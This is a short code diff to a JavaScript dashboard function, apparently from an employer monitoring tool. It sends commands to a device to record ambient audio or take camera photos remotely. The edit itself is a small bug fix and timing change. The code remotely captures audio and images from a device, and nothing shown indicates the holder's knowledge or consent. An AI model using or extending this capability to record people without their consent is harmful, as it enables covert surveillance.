@@ -123,22 +123,23 @@ async function sendCommand(type) {
     const duration = document.getElementById('record-duration')?.value || 30;
     const facing = document.getElementById('camera-facing')?.value || 'back';
     console.log('Sending command:', type, 'facing:', facing, 'duration:', duration);
-    
+
     const res = await fetch('/employer/command', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ token: deviceToken, type, duration: parseInt(duration), facing })
     });
     const data = await res.json();
+    const msg = document.getElementById('remote-msg');  // ← moved inside function
     
     if (data.success) {
         msg.style.display = 'block';
         msg.style.background = '#dfd';
         msg.style.color = '#060';
-        msg.textContent = type === 'record_ambient' 
+        msg.textContent = type === 'record_ambient'
             ? 'Recording command sent! Audio will appear below within 2 minutes + recording duration.'
             : 'Photo command sent! Image will appear below within 2 minutes.';
-        setTimeout(loadRemoteResults, 5000);
+        setTimeout(loadRemoteResults, 10000);
     } else {
         msg.style.display = 'block';
         msg.style.background = '#fde';
